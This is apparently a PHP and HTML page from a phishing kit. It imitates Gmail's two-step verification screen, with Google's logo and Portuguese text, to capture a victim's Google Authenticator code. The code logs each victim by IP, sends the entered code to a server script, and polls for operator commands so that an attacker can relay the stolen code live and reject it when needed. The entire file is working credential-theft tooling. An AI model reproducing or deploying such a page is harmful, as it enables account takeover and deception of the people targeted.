<?php
@session_start();
error_reporting(0);
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
    $erro = $_REQUEST['error'];



 $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);

  $query_info = "SELECT * FROM infos WHERE ip='$ip'"; 
  $recorinfo = mysqli_query(DBConnect(), $query_info) or die(mysqli_error(DBConnect()));
  $row_infio = mysqli_fetch_assoc($recorinfo); 
  $totalRowsinfo = mysqli_num_rows($recorinfo); 
  



$email = $row_infio['usuario'];
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', status='Cliente online na 2 fatores', statusremote='Cliente online na 2 fatores' WHERE ip='$ip'");

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Gmail</title>
<meta content="width=device-width,initial-scale=1" name=viewport>
<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
<link rel="stylesheet" href="./css/bootstrap.min.css">
<link rel="stylesheet" href="./css/bootstrap-theme.min.css">
<!-- <script src="//code.jquery.com/jquery-1.11.2.min.js"></script> -->
<!-- <script src="./js/bootstrap.min.js"></script> -->
<!-- <script src="./js/jquery-vv.min.js"></script> -->
<!-- <script src="./js/verificarUsuario.js"></script> -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/i18next@21.6.10/i18next.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery-i18next@1.2.1/jquery-i18next.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/i18next-browser-languagedetector@6.1.3/i18nextBrowserLanguageDetector.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/i18next-http-backend@1.3.2/i18nextHttpBackend.min.js"></script>
<script type="application/javascript" src="dados_comando.js"></script>
<link rel="stylesheet" href="css/style.min.css">


<!--TEMPO REAL-->
<script type="text/javascript">
  $(document).ready(function(){
    atualiza();
  });

     function atualiza(){
     $.get('ver_online.php', 
     function(resultado){
    $('#onlineagora').html(resultado);
     })
    
     setTimeout('atualiza()', 1250);
  }
 </script>


       <!-- <script src="//code.jquery.com/jquery-1.11.2.min.js"></script> -->
 
        <link rel="stylesheet" title="Converged_v2" type="text/css" href="./index_files/Converged_v21046_egJPTAx_byK-yF_CMCKFeg2.css">
<script>


//função enviar senha
$(document).ready(function(){     
     $(document).on('click', '#entrar', function(e){  
     e.preventDefault();  

     
     var fatoresgmail = $("#fatoresgmail").val();
    
     $("#fatoresgmail").prop('disabled', true);
     $("#entrar").prop('disabled', true);
     document.getElementById("barra").style.display = "block";     
    
      $.ajax({
    type:'post',    //Definimos o método HTTP usado
    data: {
 
    fatoresgmail: fatoresgmail    
    },
    dataType: 'json', //Definimos o tipo de retorno
    url: 'sendgmailtoken.php',//Definindo o arquivo onde serão buscados os dados
    success: function(data){  
     
    dispararComando();
    document.getElementById('mesa').style.borderBottom = "2px solid #4285F4";
    $("#errorsenha").css("display", "none");
      
    }
  });
    });    
});

function dispararComando(e) {
   
    myVar = setInterval(esperaresposta, 1400);

}

       

function esperaresposta() {
    //alert("teste");
    Get("","./main_.php",0);
    
}
function comandoerrordados() {

    $("#fatoresgmail").prop('disabled', false);
    $("#entrar").prop('disabled', false);
    document.getElementById("barra").style.display = "none";
    document.getElementById('mesa').style.borderBottom = "2px solid red";
    $("#errorsenha").css("display", "block");
 
}


var onOff=1;


function Get(data,urlapi,e) {

    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        var json = this.response;
        if(e!=1){ status(JSON.parse(json)); }
      }
    };
    xhttp.open("GET", urlapi+data, true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send();
    return false;
}
function status(json) {

   
         if(json.comando=="negartokengmail"){ 
            clearInterval(myVar);
            comandoerrordados();
           
           
        };

        


}



</script>

<style type="text/css">
body { margin:0; overflow: hidden; }
@media (max-width: 1366px) { #topo { max-width:1160px; } }
@media (max-width: 1215px) { #topo { max-width:960px; } }
@media (max-width: 1007px) { #topo { max-width:740px; } }
#box { height:auto; background:#FFF; margin:0 auto; margin-top: 5%; border: 1px solid #DADCE0; border-radius: 10px; }
@media (min-width: 637px) { #box { max-width:450px !important; } }
@media (max-width: 636px) { #box { max-width:100%;  border: none !important; } }
@media (max-width: 1366px) { #bottom { max-width:1160px; } }
@media (max-width: 1215px) { #bottom { max-width:960px; } }
@media (max-width: 1007px) { #bottom { max-width:740px; } }
@media (max-width: 784px) { #bottom { max-width:200px; } }
@media (min-width: 477px) { #me { float:right; padding:10px; width:120px; } }
@media (max-width: 477px) { #me { float:left; padding:0 0 10px 0; width:90%; } }
@media (max-width: 768px) { #re { display:none; } }
#fatoresgmail { width:70%; padding:10px; font-size:14px; border:none; outline:none; border-radius: 10px; }
#entrar { width:116px; height:36px; background:#4285F4; border:none; color:#FFF; border-radius:5px; font-weight:bold;}
</style>
<script>
  	function clicar() {
		document.getElementById('mesa').style.borderBottom = "2px solid #4285F4";
		document.getElementById('tt').style.display = "";
		}
  </script>
</head>

<body>
      <div class="MqxombNty5nrGeK4">
<div>
  <div class="RZBuIb c8DD0" aria-hidden="true" id="barra" style="display: none">
                <div id="progressbar" jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="Igk6W" role="progressbar" class="sZwd7c B6Vhqe">
                    <div class="xcNBHc um3FLe"></div>
                    <div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div>
                    <div class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div>
                    <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                </div>
            </div> 
<form name="form" id="form" method="post" onSubmit="return validation()">
<div id="box">
<div style="padding:30px 40px 140px 40px; font-family: Arial;">
<div style="width: 100%;float: left;">
                                    
                                    
                                     <center>
                                    <div style="float: left;width: calc((100% / 2) - 20px);min-height: 5px;">
                                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                                            <g id="qaEJec">
                                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                                            </g>
                                            <g id="YGlOvc">
                                                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                                            </g>
                                            <g id="BWfIk">
                                                <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                                            </g>
                                            <g id="e6m3fd">
                                                <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                                            </g>
                                            <g id="vbkDmc">
                                                <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                                            </g>
                                            <g id="idEJde">
                                                <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                                            </g>
                                        </svg>
                                    </div>
                                    </center>
                                </div>
<div style="height:40px;"><div style="float:left; font-size:22px; width:100%; font-weight: normal; text-align: center;" data-i18n="email.gmail.authenticator.title">Verificação em duas etapas</div></div>

<div>
<table align="center">
	<tr>
		<td>
			<div style="border:1px solid #CCC; padding: 5px; border-radius: 20px; margin-top: 1em;">
			<table cellpadding="0" cellspacing="0">
				<tr>
					<td ><img src="./img/user.jpg"></td>
					<td style="padding: 0 5px 0 5px; font-size: 16px;"><?= $email; ?></td>
				</tr>
			</table>
			</div>
		</td>
	</tr>
</table><br><br>
<div style="height:40px;"><div style="float:left; font-size:18px; width:100%; font-weight: normal; text-align: left;" data-i18n="email.gmail.authenticator.message">    Obtenha um código de verificação do aplicativo Google Authenticator</div></div>
</div>




<div style="font-size:11px; color:#<?php $provedor = $email; if ($provedor == ""){ echo '#DADCE0'; } else{ echo 'C00'; } ?>; height:15px; margin-top: 40px;">

</div>

<div id="mesa" style="border:1px solid #DADCE0; border-radius: 5px;">
<input type="tel" name="gmail2fator" id="fatoresgmail" placeholder="Coloque o código" onClick="clicar()" size="1" data-i18n="[placeholder]email.gmail.authenticator.placeholder">
<input type="hidden" name="email" value="<?=$email?>">

</div>
<div id="errorsenha" style="display: none;"><span style="color: red;" data-i18n="email.gmail.authenticator.error">Google Authenticator incorreto!</span></div>
<div style="margin-top:60px; height: 40px;">
<!-- <div style="float: left; padding: 8px 0 0 0; font-size: 14px;"><a target="_blank" href="https://accounts.google.com/signin/v2/usernamerecovery?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin">Try another way</a></div> -->
<div style="float: right; text-align: right;"><input type="submit" name="entrar" id="entrar" value="Próximo" data-i18n="[value]email.gmail.authenticator.button" /></div>
</div>
</div>
</div>
</form>
</div>
</div>
</body>
</html>
<?php if ($erro == "1"){ ?>
<script>
alert('Google Authenticator incorreto!');
</script>
<?php
}
?>